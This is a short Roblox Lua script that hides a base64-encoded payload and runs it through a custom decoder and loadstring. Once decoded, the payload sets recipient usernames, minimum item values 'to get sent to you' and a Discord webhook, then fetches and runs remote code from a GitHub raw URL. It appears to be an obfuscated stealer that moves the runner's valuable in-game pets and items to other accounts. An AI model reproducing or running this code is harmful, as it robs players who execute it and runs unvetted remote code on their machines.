
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJueWVoc2syIiwKICAgICJueWVoc2syIiwKICAgICJueWVoc2syIiwKfQptaW5fcmFwID0gMTAwMDAgLS0gbWluaW11bSByYXAgb2YgZWFjaCBpdGVtIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQptaW5fY2hhbmNlID0gMTAwMCAtLSBtaW5pbXVtIGNoYW5jZSBvZiBwZXRzIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDM5NTk4NjAyNDAzMjI2NjQvUVBhSG42cUhkMzh0TFZuZEsyNm8zSHpmdURxbWV0YVlHUmhEYnhsZXNydDJwcVVNQVFVU1hRYzliaHpyaDhSOGhfX1MiCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpLzIxNHNjcmlwdHMvcmVmcy9oZWFkcy9tYWluL3BldCUyMGdvIiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()